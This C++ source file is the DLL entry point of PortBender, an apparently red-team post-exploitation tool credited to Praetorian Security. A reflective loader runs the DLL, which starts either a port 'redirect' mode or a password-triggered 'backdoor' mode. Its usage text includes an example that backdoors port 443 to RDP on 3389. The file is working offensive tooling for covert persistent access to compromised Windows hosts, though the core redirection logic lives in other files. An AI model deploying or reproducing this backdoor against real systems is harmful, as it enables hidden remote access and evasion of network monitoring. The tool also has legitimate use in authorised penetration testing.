// Copyright 2021 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <iostream>
#include <stdio.h>

#define WIN32_LEAN_AND_MEAN

#include "Arguments.h"
#include "PortBender.h" 

//
// Local Function Prototypes
//

void RealEntrypoint(char* argument_string);

//
// Invoked by the reflective loader with "lpReserved" as the pointer
// to an argument string
//

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:

		if (lpReserved != NULL) {
			RealEntrypoint((char *)lpReserved);
		} else {
			printf("Error PortBender requires an argument string\n");
		}

		fflush(stdout);
		ExitProcess(0);
		break;
	}

	return bReturnValue;
}

void RealEntrypoint(char* argument_string) {
	try {
		Arguments args = Arguments(argument_string);

		std::cout << " _______                        __      _______                             __                           " << std::endl;
		std::cout << "/       \\                      /  |    /       \\                           /  |                        " << std::endl;
		std::cout << "$$$$$$$  | ______    ______   _$$ |_   $$$$$$$  |  ______   _______    ____$$ |  ______    ______        " << std::endl;
		std::cout << "$$ |__$$ |/      \\  /      \\ / $$   |  $$ |__$$ | /      \\ /       \\  /    $$ | /      \\  /      \\ " << std::endl;
		std::cout << "$$    $$//$$$$$$  |/$$$$$$  |$$$$$$/   $$    $$< /$$$$$$  |$$$$$$$  |/$$$$$$$ |/$$$$$$  |/$$$$$$  |      " << std::endl;
		std::cout << "$$$$$$$/ $$ |  $$ |$$ |  $$/   $$ | __ $$$$$$$  |$$    $$ |$$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/       " << std::endl;
		std::cout << "$$ |     $$ \\__$$ |$$ |        $$ |/  |$$ |__$$ |$$$$$$$$/ $$ |  $$ |$$ \\__$$ |$$$$$$$$/ $$ |          " << std::endl;
		std::cout << "$$ |     $$    $$/ $$ |        $$  $$/ $$    $$/ $$       |$$ |  $$ |$$    $$ |$$       |$$ |            " << std::endl;
		std::cout << "$$/       $$$$$$/  $$/          $$$$/  $$$$$$$/   $$$$$$$/ $$/   $$/  $$$$$$$/  $$$$$$$/ $$/             " << std::endl;
		std::cout << "                                                                                                         " << std::endl;
		
		if (args.Action == "backdoor") {
			std::cout << "Initializing PortBender in backdoor mode" << std::endl;
			PortBender backdoor = PortBender(args.FakeDstPort, args.RedirectPort, args.Password);
			backdoor.Start();
		} else if (args.Action == "redirect") {
			std::cout << "Initializing PortBender in redirector mode" << std::endl;
			PortBender redirector = PortBender(args.FakeDstPort, args.RedirectPort);
			redirector.Start();
		}
	} catch (const std::invalid_argument&) {
		std::cout << "Redirect Usage: PortBender redirect FakeDstPort RedirectedPort" << std::endl;
		std::cout << "Backdoor Usage: PortBender backdoor FakeDstPort RedirectedPort password" << std::endl;
		std::cout << "Example:" << std::endl;
		std::cout << "\tPortBender redirect 445 8445" << std::endl;
		std::cout << "\tPortBender backdoor 443 3389 praetorian.antihacker" << std::endl;
		std::cout << std::flush;
	}
}
